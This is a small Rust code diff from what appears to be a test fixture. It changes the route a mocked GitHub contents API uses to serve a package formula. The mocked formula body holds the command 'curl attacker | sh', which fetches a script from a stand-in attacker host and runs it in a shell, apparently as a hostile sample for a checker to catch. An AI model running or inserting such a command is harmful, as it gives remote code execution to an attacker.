@@ -189,7 +189,7 @@ fn apply_mutation(
             let route = format!(
                 "repos/{}/contents/{}?ref={}",
                 candidate.policy.repository,
-                candidate.policy.formula,
+                candidate.formula_path,
                 "d".repeat(40)
             );
             responses.insert(route, content(b"system \"curl attacker | sh\"\n"));
